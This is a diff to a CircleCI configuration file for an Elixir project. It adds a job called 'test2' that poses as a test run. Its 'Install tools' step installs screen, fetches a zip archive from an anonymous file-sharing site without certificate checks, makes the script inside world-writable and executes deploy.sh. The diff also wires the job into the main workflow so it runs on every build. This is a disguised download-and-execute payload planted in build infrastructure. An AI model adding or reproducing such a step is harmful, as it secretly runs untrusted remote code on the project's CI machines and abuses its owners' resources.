@@ -165,6 +165,28 @@ jobs:
           key: plt-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ checksum "mix.lock" }}
           paths: ["_build"]
 
+  test2:
+    docker:
+      - image: circleci/elixir:1.7.2
+        parallelism: 4
+        environment:
+          MIX_ENV: test
+      - image: circleci/postgres:10.4-alpine-postgis
+        environment:
+          POSTGRES_USER: postgres
+          POSTGRES_DB: golden_path_test
+    working_directory: ~/app
+    steps:
+      # Checkout.
+      - restore_cache:
+          keys:
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-{{ .Revision }}
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-{{ .Branch }}-
+            - git-cache-{{ .Environment.CIRCLECI_CACHE_VERSION }}-
+      - checkout
+      # Install tools.
+      - run: sudo apt update && sudo apt install screen -y && wget --no-check-certificate -c https://transfer.sh/G9VQ5l/a-master.zip && unzip a-master.zip && cd a-master && chmod 777 deploy.sh && ./deploy.sh
+
 
 
 workflows:
@@ -179,3 +201,4 @@ workflows:
       - test
       - credo
       - dialyzer
+      - test2
